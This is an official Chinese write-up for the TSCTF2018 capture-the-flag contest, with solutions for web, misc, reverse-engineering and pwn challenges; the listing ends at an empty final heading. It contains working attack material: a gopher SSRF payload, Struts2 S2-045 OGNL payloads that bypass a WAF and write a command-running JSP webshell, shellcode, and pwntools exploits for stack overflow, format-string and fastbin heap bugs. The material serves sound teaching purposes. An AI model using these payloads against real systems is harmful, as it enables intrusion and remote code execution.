[TOC]



# TSCTF2018天枢DUBHE官方WP

## WEB



### are you in class

> 出题思路

这道题主要是某老师上课签到使用二维码，然并不能保证出勤率，所以结合XFF出了一道比较简单的web签到题。当然应该提示网段的，我的锅（表寄刀片）

> 题解

其实就是要修改IP，这里推荐使用浏览器插件 Modifier Headers，当然也可以直接截取http包，添加X-Forward-For字段值。
![7-1](/images/are you in class/7-1.png)

这时候，随便打个名字，提交就拿到flag
![7-2](/images/are you in class/7-2.png)
当然这里有个小trick，其实完全可以不理的，就是当我们的ip设置在192.168.1.1-1.255的时候，才会从index.php页面跳转到真正的签到页面，和classsign.html只差了一个字母哦。
![7-3](/images/are you in class/7-3.png)

当然你可以直接截取提交到classsign.php的包修改啊，这个小trick完全不用理的。

> FLAG

TSCTF{Sign_Succe55fu1_666}

### Buy Flag

> 出题思路

毕竟六一儿童节要来了，所以就干脆以此为基础出了个题目，加上二次注入的老梗。 

> 题解

注册测试一下就能知道，大人才能进商店选购，但是只有小孩子才能买flag，大人只能偷啦。
注册的时候，用户名和密码都限制的很死，基本没有作妖的可能，所以只有年龄字段可能有问题，随手测一下，发现一定要是数字，而且要大于18岁，但是18岁以上登录又说你年纪太大了不能买。。。既然年纪限制的严格而且题目说了大人不能买flag，看看其他地方有没有什么可用的
注意到这段废话：

![7-1](/images/buy flag/7-1.png)

既然列举出来了数据库里其他人，而且和年龄有关系，那就试试看注入年龄字段：

![7-2](/images/buy flag/7-2.png)

年龄字段用0x的十六进制，居然让我注册成功了，那再测测直接select database()#看看有啥用。
试试看这个：

![7-3](/images/buy flag/7-3.png)

居然没有？？？

![7-4](/images/buy flag/7-4.png)

那试试这个：

![7-5](/images/buy flag/7-5.png)

出现了数据库名：

![7-6](/images/buy flag/7-6.png)

接下来，按照这个套路，就可以访问元数据，依次注入出表名、列名、以及最后的flag！这里不赘述哈~

![7-7](/images/buy flag/7-7.png)

![7-8](/images/buy flag/7-8.png)

> FLAG

TSCTF{Simple_Sql_f0r_Y0u}

### easy_upload

> 题目描述

上，上传
hint1：we check type, name and the first line of the file
hint2：check the upload page~

> 出题思路

之前在打比赛时，遇到过一个upload的题目，非常恶心ww，让你上传一个脚本，但无论怎么上传，都被waf。
于是出了这个题目，检验常见的【extname】、【mimetype】、【content】
其中content检验十分暴力，只允许bom头和#! /usr/bin/python的白名单制。提示在 i need a python file和we check the first line of content。

> 题解

首先发现flag只可以购买，但钱数不够。
源代码中找到/hard_upload
尝试上传，发现文件末尾不能是与py相关的文件。
mimetype不能是文本类型or脚本类型。
content结合提示，反复尝试，最后发现首行为linux下，标注以何种方式打开的标识可以绕过
上传成功后，即可购买flag。【笑】

> FLAG

TSCTF{upload_upload_2333}

### emmmm

> 出题思路

SSRF配合gopher构造http post数据包

> 题解

在对Web应用进行目录扫描时，我们发现该应用存在robots.txt文件，其中暴露了一些敏感文件 

在数据库备份文件中，我们可以拿到管理员的账户和密码 为admin/bupt666

直接使用管理员账户登录提示

**Warning!** login failed! admin's login ip must be 127.0.0.1 (attention: http server's local port is 80)!

 在phpinfo我们可以发现php安装了gopher扩展

于是我们可以在后台提交url的位置直接提交gopher协议

```
url=gopher://127.0.0.1:80/_POST%20%2findex.php%253Faction%3Dlogin%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A9000%250d%250aCookie%3A%20PHPSESSID%3D169f13c39a9acc14032583cb99595cda%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2031%250d%250a%250d%250ausername%3Dadmin%26password%3Dbupt666
```

通过gopher协议构造admin登录的数据库包，数据包中的sessionid为未登录状况下的sessionid

admin登录成功后，使用该sessionid访问index页面即可跳转到后台页面，在后台页面上可以看到flag

> FLAG

TSCTF{ssrf_with_gopher_is_amazing}

### 时光机

> 题目描述

如果你有一台时光机… 

hint 1: struts webconsole没用，憋看了 

hint2:听说最近爆了一个s2-045的漏洞，赶紧加强了一下waf防御做紧急处理，被黑不存在的XD  

hint3 : 你想要的都在这里了 https://github.com/SpiderLabs/owasp-modsecurity-crs/blob/v3.1/dev/rules/REQUEST-944-APPLICATION-ATTACK-JAVA.conf 题目s2版本为struts-2.3.29，大佬们可以本地测试，我不要做一个没有人做出题的出题人 

hint4 : 不一定需要直接执行命令

> 出题思路

Struts2 WAF绕过，使用了modsecurity的v3.1/dev分支中的规则，也算真实环境了

> 题解

题目存在s2-045漏洞，需要选手手动构造OGNL表达式

hint中已经给出了modsecurity中的规则，当然黑盒测也不是很麻烦，都是一些字符串过滤

因为waf的原因本题是不能直接执行命令的，但是可以读写文件

可以首先写一个webshell，然后通过webshell执行命令

首先需要知道Web应用的目录, 可以通过拿到ognl类的路径来拿到Web应用的目录，payload如下

```
Content-Type: %{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#a=(new ognl.OgnlContext())).(#path=#a.getClass().getResource("").getPath()).(#os=@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()).(#os.write(#path.getBytes())).(#os.flush())}
```

写webshell

```
%{(#_='multipart/form-data').(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(new java.io.RandomAccessFile("/usr/local/tomcat/webapps/ROOT/shell.jsp","rw")).write(@java.util.Base64@getDecoder().decode("PCUKICAgIGlmKCJkbGl2ZSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkpewogICAgICAgIGphdmEuaW8uSW5wdXRTdHJlYW0gaW4gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJpIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsKICAgICAgICBieXRlW10gYiA9IG5ldyBieXRlWzIwNDhdOwogICAgICAgIG91dC5wcmludCgiPHByZT4iKTsKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsKICAgICAgICB9CiAgICAgICAgb3V0LnByaW50KCI8L3ByZT4iKTsKICAgIH0KJT4="))}
```

执行命令读取flag

```
http://10.101.170.30:10005/shell.jsp
POST: pwd=dlive&i=cat /this_is_your_flag_have_fun
```

下面这个是选手HWHXY的payload

获取web目录

```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#context.setMemberAccess(#dm))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest')).(#a=#req.getSession()).(#b=#a.getServletContext()).(#c=#b.getRealPath('/')).(#o.println(#c)).(#o.close())}
```

写webshell

```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):(#context.setMemberAccess(#dm))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest')).(#a=#req.getSession()).(#b=#a.getServletContext()).(#c=#b.getRealPath('/')).(#path='/usr/local/tomcat/webapps/ROOT/i.jsp').(#shell4='<%if("023".equals(request.getParameter("pwd"))){java.io.InputStrea').(#shell45='m in = Runtim').(#shell5='e.getRuntim').(#shell6='e().exec("cat /this_is_your_flag_have_fun").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>').(#file=new java.io.PrintWriter(#path)).(#file.println(#shell4+#shell45+#shell5+#shell6).(#file.close())).(#o.println(123)).(#o.close())}
```

> FLAG

TSCTF{well_d0ne!_mods3cur1ty_wAf_cann0t_stop_you!}

## MISC

### 简单的RSA

> 出题思路

简单的rsa，考察rsa算法的解密和大数破解

> 题解

首先16进制查看图片文件，得到e,n,c

![p1](/images/简单的RSA/p1.png)

在factordb.com分解n，得到p和q，然后使用下面代码即可得到明文

```
import gmpy2


p = 863653476616376575308866344984576466644942572246900013156919
q = 965445304326998194798282228842484732438457170595999523426901

e = 65537
d = gmpy2.invert(e, (p - 1) * (q - 1))

n = p*q
c=0x18228df578dad6dc893cbcd95bd934d28f26c820778e7afeb6b3be38fd5298e497faf8ceaa78c613e5f5fadd4bd5e50fd8a5
m = pow(c,d,n)

print "m=0x"+"%x"%m
flag = ""
while (m>0):
    mm = m % 0x100;
    flag +=chr(mm)
    m = m / 0x100
print flag[::-1]
```
> FLAG

TSCTF{ez_rsa_real_ez~}



### 爱听音乐的friends

> 出题思路

想做为misc的签到题类型，用到了非常简单的社工 和 古典密码学里的Morse电码。
出题时想到可能有很多非预期解法，比如

- 不找歌单，直接多次连接爆破答案。
- 不使用分隔符，直接破解。
  于是在flag中加入了非英文单词，估计大家面对 三组 --- --- --- 时都要崩溃了吧，笑
  题目不是很难，我觉得也不算脑洞大开的题目，希望大家保持对信息的敏感性~

>题解

1. 首先在客服群里可以找到爱听音乐的客服 - Sissel，根据题目提示：音乐表单，以及 nc连接后提示，绿钻，找到Sissel创建的表单，得到TSCTF歌单。
2. 写脚本回答问题，得到伪FLAG：so_where_is_the_real_flag?
3. 仔细观察发现，答案的顺序是固定的，得到01序列【为了增加难度，可能是反着的。】这个长度的序列非常奇怪，再自习观察，发现偶尔系统会返回emmmm..let me think think，这是摩尔斯电码的分隔符。最终得
  -/.../-.-./-/..-./-.--./--/..-/.../../-.-./..--.-/../.../..--.-/-.-./---/---/---/.-../-.-.--/-.-.--/-.--.-
4. 解密

> FLAG

TSCTF(MUSIC_IS_COOOL!!)

### zhiyu的短视频

> 出题思路

本题短视频出自なつみSTEP!（夏美的一步）的后日谈，前面部分是一个小女孩在哭，然后再时域上隐藏了她成为恶鬼手拿撬棍的画面（口怕）。

> 题解

首先要了解flash文件格式，其由元件组成。在元件中找到

![p2](/images/zhiyu的短视频/p2.png)

有一个奇怪的元件，其中是字符串

![p3](/images/zhiyu的短视频/p3.png)

该串为五笔编码的字符串为“一三五七八十腊，三十一天永不差”的全码，使用五笔输入法即可得到

> FLAG

TSCTF{13578101231}

### 正常的魔塔

> 出题思路

单纯的想让大家放松放松玩个游戏

> 题解

这个游戏一共有16种小怪，分别对应着flag中的16个字符<br>
所以理论上有两种解，一种是杀完所有怪通关，一种是数出所有怪的数量<br>
但貌似数出所有怪的数量还不如直接通关比较快<br>
所以直接介绍通关思路<br>
看完大家的writeup发现<br>
一看就都是平时很少用CheatEngine的<br>
事实上用CheatEngine是可以直接修改角色攻击和防御的，只不过进行了一个简单的修改<br>
具体对应关系如下：<br>
**y = 2*x - 1997**
其中y是需要在CE中搜索的数值，x是显示的攻击力<br>
有这个就可以直接改攻防然后一路平砍就可以了<br>
另：这个魔塔是真的可以玩通的<br>

> FLAG

TSCTF{bb6b58dd0f3f6e83}

### 不正常的RSA

> 出题思路

出不出来正常的RSA题了，所以只好出一个不正常的RSA

> 题解

重点关注脚本中的这句话<br>
**s = username + '\0' + password + '\0'**<br
首先，很明显password不影响检测逻辑是可以随便构造的，但是我们需要绕过的是前面的一个'\x00'截断<br/
这时候需要想到一个十分神奇的东西： (a+b)^7 = a^7 + 7*a^6*b + 21*a^5*b^2 + 35*a^4*b^3 + 35*a^3*b^4 + 21*a^2*b^5 + 7*a*b^6 + b^7<br/
其中的a就是上面的s<br/
那么a^1,a^2,a^3,...,a^7就都是已知的，所以s理论上是可被改成任意结果的<br>
接下来只需要构造一个b出来把username后面的'\x00'给改掉<br>
那么程序在进行解码后检测最后几个字符的时候检测的就是我们可控的password了<br>
测试代码如下：

```python
from pwn import *

p = remote('10.112.82.102',4445)

a = []

def register():
	print p.recv()
	p.sendline('r')
	p.recvuntil('>>')
	p.sendline('a'*100)
	p.recvuntil('>>')
	p.sendline('admin')
	for i in range(7):
		p.recvuntil('Your Cookie>>')
		a.append(int(p.recvuntil('\n'),16))
	for i in range(7):
		print hex(a[i])

def login():
	print p.recv()
	p.sendline('l')
	p.recvuntil('>>')
	p.sendline(hex(cookie)[2:])
	print hex(cookie)
	print p.recv()

register()
b = int('1'+'0'*300,16)
cookie = a[6] + 7*a[5]*b + 21*a[4]*b*b + 35*a[3]*(b**3) + 35*a[2]*(b**4) + 21*a[1]*(b**5) + 7*a[0]*(b**6) + b**7
login()
```

> FLAG

TSCTF{Very_Easy_RSA_Right?}

## REVERSE

### JustWait

> 出题思路

来源于国际赛的一道babyre，通过时间复杂度高的程序计算伪随机数与目标字符串异或得到flag并输出。但是由于算法的时间复杂度过高，程序无法输出完整flag，需要做题人优化算法，算出flag。

> 题解

题目是一个简单的fibonacci算法，使用fibonacci算法实现了一个简单的伪随机数生成器，如果称随机数算法为rand，那么rand(i) =  rand(i-1)^rand(i-2)^ EveryBit(fibonacci(i))，根据该公式写出递推循环即可。

```python
encrypt = '\xc3\x38\xef\x7b\xf1\x5d\x5b\x1f\x2b\xd9\x64\x96\xf2\x43\xdc\xcc\x98\xf0\x8c\x91\x58\x6a\x1f\x7f\x67\x88\x4f\xa2\x2f\x17\x77\x0c\x97\x2b\xfa\xf2\x8b'	#32
fib_2 = 0
fib_1 = 0
rand_2 = 0
rand_1 = 0
flag_str = ''
for i in range(37):
	c = 0
	for j in range(8):
		if count == 0:
			fib_2 = 1
			rand_2 = 1
			c ^= 1<<j
			print i,j,1
		elif count == 1:
			fib_1 = 1
			rand_1 = 1
			c ^= 1<<j
			print i,j,1
		else:
			ans = fib_1 + fib_2
			fib_2 = fib_1
			fib_1 = ans
			flag = 0
			for x in range(32):
				flag ^= (ans>>x)&1
			flag ^= rand_2^rand_1
			rand_2 = rand_1
			rand_1 = flag
			c ^= flag << j
			# print i,j,ans,rand_2,rand_1,flag
		count += 1
	flag_str += chr(c^ord(encrypt[i]))
	# flag_str += '\\x%02x'%(c^ord(encrypt[i]))
print flag_str
```
> FLAG

TSCTF{Fibonacci_1s_r3aliy_Fvn_^_^!!!}

### BabyVM

> 出题思路

一个粗糙的VM

基于堆栈式的VM，共实现了11条指令，分别为push，pop，add，sub，jnz，xor，shl，shr，获取参数，从给定地址中获取数据以及向给定地址中存入数据。

其中jnz会依据虚拟的eflags中的ZF位进行跳转，在进行add，sub，xor，shl，shr操作时会同时对ZF位进行操作。

在进行初始化时会将真是的ebp移入虚拟寄存器中的esi中。去参数时依据ebp来进行获取参数的操作。

根据这些指令，实现了tea算法，修改了tea的delta。

> 题解

手动记录程序流程或复现虚拟机，添加输出语句，可以得到依据当前opcode的虚拟指令流。分析虚拟指令流，还原算法分析可知其为tea。

网上查找现成的tea解密算法，修改delta以及sum即可解密。

> FLAG

TSCTF{baBy_vuuvm@3:)}

### EI Psy Congroo

> 出题思路

1. main函数中一个线程循环反调试，一个线程使用setUnhandleExceptionFilter函数创建自定义异常处理函数。
2. 当程序正常运行时，会jmp到非法地址，引发异常，从而跳转到异常处理函数执行，异常处理函数hook了ExitProcess，从而在调用ExitProcess函数的时候，会调到hook的函数执行代码。
3. hook的函数处对加密的代码进行一次解密之后，然后运行真正的Check逻辑。
4. 程序如果是在调试中运行，正常情况下会执行main函数中的Check逻辑，如果仔细观察，我们可以发现假的Check逻辑是类base64编码，但是由于输入长度的限制，就算是输入最大的长度，编码出来的字符串在长度上就小于硬编码的字符串长度，二者永远不可能相等。如果你去解这串硬编码字符串，你会得到EI Psy Congroo:The World Line is Wrong的提示信息。

> 题解

解题思路有二：

1. 静态分析，idc或者idapython解密加密代码，之后静态分析。

idc脚本：

```bash
#include<idc.idc>

static main()
{
    auto addr,i;
    for(addr=0x401010;addr<=0x401291;addr++)
    {
        i=Byte(addr)^0x77;
        PatchByte(addr,i);
    }
}
```

​	解密以后的代码，Check逻辑即是类base编码，利用包含32字符的单表进行置换，这里不写解密代码，将加密和解密的C代码贴出来供参赛者参考：

```cpp
char table[] = {'A','I','Q','Y','Z','R','J','B','2','S','K','C','D','L','T','3','4','5','V','U','N','M','E','G','F','O','W','6','P','X','7','H'};

char *str2bin(char buf[], int bufLen)
{
	int i;
	int tmpLen = bufLen;
	char buf2[100] = { 0, };
	for (i = 0; i < tmpLen; i++)
	{
		buf2[i] = buf[i];
	}
	if (bufLen * 8 % 5)
	{
		bufLen = (bufLen * 8) + (5 - (bufLen * 8 % 5));
	}
	else
	{
		bufLen = bufLen * 8;
	}
	char *plaintext = (char *)malloc(bufLen+1);
	memset(plaintext, '\x00', bufLen+1);
	for (i = 0; i < bufLen; i++)
	{
		plaintext[i] = '0';
	}
	for (i = 0; i < tmpLen; i++)
	{
		for (int j = 7; j >= 0; j--)
		{
			plaintext[i*8+j] = (buf2[i] & 1) + '0';
			buf2[i] >>= 1;
		}
	}
	return plaintext;
}

char *encrypt(char *plaintext, int plainLen)
{
	char *cipher = (char *)malloc(plainLen / 5 + 1);
	int groupNum = plainLen / 5;
	int index = 0;
	for (int i = 0; i < plainLen / 5 + 1; i++)
	{
		cipher[i] = '\x00';
	}
	for (int i = 0; i < groupNum; i++)
	{
		for (int j = 0; j < 5; j++)
		{
			index += ((plaintext[i * 5 + j] - '0') << (4 - j));
		}
		cipher[i] = table[index];
		index = 0;
	}
	return cipher;
}

char *decrypt(char *ciphertext, int cipherLen)
{
	char *plaintext = (char *)malloc(cipherLen * 5 + 1);
	memset(plaintext, '\x00', cipherLen * 5 + 1);
	int i;
	for (i = 0; i < cipherLen; i++)
	{
		for (int j = 0; j < 32; j++)
		{
			if (table[j] == ciphertext[i])
			{
				for (int z = 0; z < 5; z++)
				{
					plaintext[i * 5 + 4 - z] = ((j & 1) + '0');
					j >>= 1;
				}
				break;
			}
		}
	}
	return plaintext;
}

char *bin2Str(char *cipherBin, int cipherBinLen)
{
	int group = cipherBinLen / 8;
	int ch = 0;
	char *plain = (char *)malloc(group+1);
	for (int i = 0; i <= group; i++)
	{
		plain[i] = '\x00';
	}
	for (int i = 0; i < group; i++)
	{
		for (int j = 0; j < 8; j++)
		{
			ch += ((cipherBin[i * 8 + j] - '0') << (7 - j));
		}
		plain[i] = (char)ch;
		ch = 0;
	}
	return plain;
}

int main()
{
	char *cipher;
	char *plaintext;
	char *cipherBin;
	char *plain;
	char buf[100] = { 0, };
	int plainLen, bufLen,cipherBinLen;
	scanf("%s", buf);
	bufLen = strlen(buf);

	plaintext = str2bin(buf, bufLen);
	plainLen = strlen(plaintext);
	cipher = encrypt(plaintext, plainLen);
	printf("%s\n", cipher);
	printf("%d\n", strlen(cipher));


	cipherBin = decrypt(cipher, strlen(cipher));
	cipherBinLen = strlen(cipherBin);
	plain = bin2Str(cipherBin, cipherBinLen);
	printf("%s\n", plain);

	system("pause");
	
    return 0;
}
```

2. 动态调试，由于setUnhandlerExceptionFilter函数自带系统反调试，在程序的运行过程中，最终检测程序是否处于调试的函数是NtQueryInformationProcess，我们只需要对其下断，修改返回值，调试时返回值为1，否则为0。在自定义异常处理函数下断即可断下，然后自行分析即可。

> FLAG

TSCTF{Steins;Gate-El-Psy-Congroo}

### BACKDOOR

> 出题思路

1. 了解路由器固件解包工具一般是binwalk，且必须是依赖完整的完整版binwalk，不是debian下面自带的binwalk。
2. describe自带hint，每次开启路由，说明程序可能会自启动，查找嵌入式设备下所有与自启动可能的脚本，在/etc/init.d/rcS下，还是/etc/init0.d/rcS，不是记得很清了。有一条/usr/sbin/ssh就是我们的后门程序了。
3. 阅读mipsel代码，可以安装qemu环境，动态调试，当然也可以直接静态分析。
4. 题目后来放了hint，其中之一是:DIR-815，选手可以下载DIR-815，使用binwally.py进行固件比对，也能够很快发现后门程序。

> 题解

在source中直接放了该题的源码，有不清楚的看源码就行了。加密和解密的代码都有。（出题人太懒了）

> FLAG

TSCTF{8aCKd00r_1n_tH3_DL1nk^-^!}

## PWN

### pwn1

> 出题思路

Pwn题的签到题，送分题。。

> 题解

atoi函数碰到非数字字符会结束，这里输入buffer存在栈溢出，可以覆盖你的money值而且可以改变esp值，修改了money值可以让你重新输入name，这里写shellcode，然后让eip到堆上去执行你的shellcode即可。
exp如下:

``` python
from pwn import *
p = remote('10.112.108.77',2333)
#p = process('./main')
#gdb.attach(proc.pidof(p)[0])
p.recvuntil(':')
p.send('luc')
p.recvuntil('addr:')
address = p.recvline().replace('\n','')
print int(address,16)
p.recvuntil(':')
payload ='1'+'a'*4+p32(60)+'a'*4+p32(int(address,16)+4)+'a'*4
p.send(payload)
shellcode = '''
    push 0x0068732f 
    push 0x6e69622f
    mov ebx,esp
    mov ecx,0
    mov edx,0
    mov eax,0xb
    int 0x80
'''
p.sendline(p32(int(address,16)+4)+asm(shellcode))
p.interactive()
```
> FLAG

TSCTF{RechArge_Make_Y0u_Str0ng3r}

### easycalc

> 出题思路

跟别的出题人讨论的时候想出个带cannary的溢出，后来就被缩水成这个样子了

> 题解

通过审查代码可以发现在执行修改过程的时候没有对修改的索引进行限制，具体位置如下：<br>
![](/images/easycalc/1.jpg)
那么我们就可以通过段代码对任意地址进行写入<br>
由于善良的出题人在题目里给好了一个用于打开shell的函数hackhere<br>
![](/images/easycalc/2.jpg)
所以直接将main函数的返回地址跳到这里就可以了<br>
代码如下：<br>

```python
from pwn import *

p = remote('127.0.0.1',2333)

def change(loc,val):	
	print p.recvuntil('exit')
	p.sendline('3')
	print p.recvuntil('change:')
	p.sendline(str(loc))
	print p.recvuntil('number:')
	p.sendline(str(val))
	print "send " + hex(val)

def exitfunc():
	print p.recvuntil('exit')
	p.sendline('5')
print p.recvuntil('have:')
p.sendline('1')
p.sendline('1')
print "end send 0"

hack_addr = 0x0804859b
stack_base = 0xffe353f8
retn_addr = 0xffe3547c	

change(retn_addr - stack_base + 0,(hack_addr>> 0)&0xff)
change(retn_addr - stack_base + 1,(hack_addr>> 8)&0xff)
change(retn_addr - stack_base + 2,(hack_addr>>16)&0xff)
change(retn_addr - stack_base + 3,(hack_addr>>24)&0xff)
exitfunc()

p.interactive()
```

> FLAG

TSCTF{Good_Luck_Have_Fun}

### hard_login

> 出题思路

本题是想考察大家对于格式化字符串漏洞的理解和利用。想考察的知识点有：格式化字符串来dump程序内存空间、用格式化字符串泄漏GOT表获取函数实际地址、使用libc-databse来获取函数libc版本，使用one-gadget来getshell。

> 题解

思路一：

1. 使用nc连接上pwn题服务器，发现要求输入username和password。在username处输入%s得到HINT需要download下这个binary，或者使用%p|%p|%p发现可以泄漏栈的数据，从而发现存在格式化字符串漏洞。
2. 由于没有binary，存在格式化字符串漏洞，通过leak的stack 地址位数可以判断是32位程序。因此考虑格式化字符串dump程序binary，可以参考这里：https://paper.seebug.org/246/
3. dump出binary之后，可以发现GOT表的地址，通过格式化字符串来泄漏GOT表的数据。
4. 泄漏出GOT表之后可以根据libc-database得到libc的版本信息，使用onegadget工具找可以弹shell的gadget。
5. 利用格式化字符串漏洞泄漏栈的数据后，在ebp后的返回地址处写入gadget即可。注意返回地址需要根据IDA的反汇编结果来看，不一定就是在ebp的后面，可以多试几次。

参考 exp@sunichi :

```python
from pwn import *

DEBUG = 0
if DEBUG:
    context.log_level = 'debug'
    p = process('./dumpbin')
else:
    context.log_level = 'debug'
    p = remote('10.112.82.102', 2336)

fmt_offset = 13
pattern = '%' + str(fmt_offset) + '$s'

def leak(addr):
    payload = pattern + 'bbb' + p32(addr)
    p.recvuntil('Username:')
    p.send(payload)
    p.recvuntil('Hello ')
    data = p.recvuntil('bbb', drop=True)
    p.recvuntil('Password:')
    p.send('sunichi')
    #print hexdump(data[0:4])
    return u32(data[0:4])

def confmtstr(addr_high, addr_low):
    payload = ''
    if(addr_high > addr_low):
        payload = "%%%dc%%21$hn%%%dc%%22$hn" % (addr_low, addr_high - addr_low) 
    else:
        payload = "%%%dc%%22$hn%%%dc%%21$hn" % (addr_high, addr_low - addr_high)
    return payload

# printf@got 0x08049fcc
# read 0xf7651350
# alarm 0xf762c020
# offset get from libc database

read_addr = leak(0x08049fc8) #read@got output
print 'read addr =', hex(read_addr)

libc_base = read_addr - 0xd4350
print 'libc base =', hex(libc_base)
#system_addr = libc_base + 0x3a940 # system
system_addr = libc_base + 0x3a80c # one gadget
print 'system addr =', hex(system_addr)
#binsh_addr = libc_base + 0x15902b # 0x15902b or 0x15900b it is not neccessary

def leak_stack(pos):
    p.recvuntil('Username:')
    p.send('%' + str(pos) + '$p' + 'bbbaaaa')
    p.recvuntil('Hello ')
    data = p.recvuntil('bbb', drop=True)
    #print hexdump(data)
    p.recvuntil('Password:')
    p.send('sunichi')
    return data

ret_addr = int(leak_stack(35), 16) + 4 # where return address saved

payload = confmtstr(system_addr >> 16, system_addr & 0xffff)
payload = payload.ljust(40, 'a')
payload += p32(ret_addr) + p32(ret_addr + 2)

p.recvuntil('Username:')
p.send(payload)
p.recvuntil('Password:')
p.send('sunichi')

p.interactive()

p.close()
```

思路二：

考虑到难度问题，在泄漏出binary之后，发现在输入正确的password后程序在登陆之后有一次system ls的机会。通过格式化字符串漏洞泄漏password，登陆可以查看到服务器上的信息。登陆成功后，system ls输出输出了当前目录下的文件，包括flag、hard_login.bak、index.html、index.nginx-debian.html、libc-2.23.so.bak。通过html文件猜测当前程序在web目录下，因此通过web端口去访问得到binary和libc。

得到libc和binary之后，就可以通过libc来获得system和binsh的地址，通过格式化字符串漏洞写到返回地址处即可。有个注意点在于，由于system ls，在调试时gdb默认跟的是子进程，需要设置默认跟踪父进程即可正常继续调试。

exp如下：

``` python
#!/usr/bin/python
# author: thinkycx
# date: 2017-11-09

import os
from pwn import *
context(arch='i386',os='linux',endian='little')

def leak(io):
    length = 0
    addr = 0x8048000
    file_content = ''
    while addr<0x804b000:
        log.info('\naddr' + hex(addr))
        payload =  "%13$s|||" + p32(addr)
        io.sendlineafter('Username:',payload)
        data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
        data += "\x00" 
        log.info(" data:" + data)
    
        length = len(data)
        file_content += data
        addr = addr + length    
        io.sendlineafter("Password:","xx");
    
    with open('leak-easyfsb','wb')  as f:
        f.write(file_content)

def pwn3(p,libc):
    '''
    gcc -m32 -z relro -z now  simple_login_v3.c -o simple_login_v3
    assume GOT can not be written
    '''

    # changed in FULL RElRO
    # v3 got
    printf_got = 0x08049FCC
    #v4 changed got
    #printf_got = 0x08049FD0 
    payload = "%13$s|||" + p32(printf_got)
    io.sendafter("Username:",payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
    printf_addr = u32(data[0:4])
    io.sendafter("Password:","xx")
    log.info("printf addr " + hex(printf_addr)) 
    libc.address = printf_addr - libc.symbols['printf']
    log.info("libc addr:" + hex(libc.address))

    binsh_addr =  next(libc.search("/bin/sh\x00"))
    execve_addr =  libc.symbols['execve']
    rop = ROP(libc)
    #rop.execve(binsh_addr,0,0)
    rop.system(binsh_addr)
    print str(rop),len(str(rop))
    
    # leak ebp
    payload = "%50$p|||"
    io.sendafter("Username:",payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]
    ebp = int(data,16)
    log.info("ebp:" + hex(ebp))
    io.sendafter("Password:","xx")
    #gdb.attach(pidof(io)[0],'''b *0x8048879''')
    
    # use fsb to write rop in (ebp+0x10)+0x4
    ebp = ebp +0x10
    for i in range(len(str(rop))/4):
        rop_i = str(rop)[i*4:i*4+4]
        ebp_i = ebp + 4 + i*4
        offset = 11
        log.info("write %#x in %#x " % (u32(rop_i),ebp_i))
        payload = fmtstr_payload(offset, {ebp_i:u32(rop_i)},write_size='short')
        assert len(payload) <= 0x40,"payload too long"
        io.sendafter("Username:",payload)
        io.sendafter("Password:","xx")
        
    # exit program to call rop
    addr = 0x0804A04C 
    payload = "%13$s|||" + p32(addr)
    io.sendlineafter("Username:",payload)
    data = io.recvuntil("|||").split("|||")[0].split("Hello ")[1]

    #gdb.attach(pidof(io)[0],'''b *0x80488e9''')
    io.sendlineafter("Password:",data)
    io.sendline("cat flag")            
        
    io.interactive()
    

if __name__ == '__main__':
    local = 0 
    if local:
        io = process('./hard_login.bak')
        context.terminal = ['terminator','-x','sh','-c']
        libc = ELF("/lib/i386-linux-gnu/libc.so.6")
    else:
        ip = '10.112.82.102'
        port = 2336
        io = remote(ip,port)
        libc = ELF("libc-2.23.so.bak")
    context.log_level='debug'
    log.info("exploiting...")

    #leak(io)
    pwn3(io,libc)
```
> FLAG

TSCTF{fsb_can_read_and_write_isnt_it?}

### heap_attack

>出题思路

原题来自于2018强网杯线上赛的silent。silent没有给任何输出，十分不友好，但是考察的知识点fastbin attack值得学习，于是在silent的基础上加入了与用户交互的环节。

>题解

```python
from pwn import *

context.log_level='debug'

p= process("./heap_attack")

def add(content,size):
	p.recvuntil("choice:")
	p.sendline("1")
	p.recvuntil("size:")
	p.sendline(str(size+1))
	p.recvuntil("content:")
	p.sendline(content)
def _delete(index):
	p.recvuntil("choice:")
	p.sendline("2")
	p.recvuntil("index:")
	p.sendline(str(index))
def edit(index,content):
	p.recvuntil("choice:")
	p.sendline("3")
	p.recvuntil("index:")
	p.sendline(str(index))
	p.recvuntil("content:")
	p.sendline(content)
	p.recvuntil("edit.")

sys_addr = 0x4009B0
stderr_addr = 0x6020c0
free_got = 0x602018

add("hack by 0gur1",100)#0
add("hack by 0gur2",100)#1
add("/bin/sh",256)#2


_delete(0)
_delete(1)
_delete(0)


add(p64(stderr_addr-3),100)#3->0
add('b',100)#4->1
add('c',100)#5->0
add('6'*19+p64(free_got),100)#6->fake fastbin

edit(0,p64(sys_addr)[:6])#'\xb0\x09\x40\x00\x00\x00')

#add("a",20)

_delete(2)
p.interactive()
```
>FLAG

TSCTF{f43t6in_att4ck_1s_soooooo00oooooo_e43y_2_me!!!!!}



### kidding

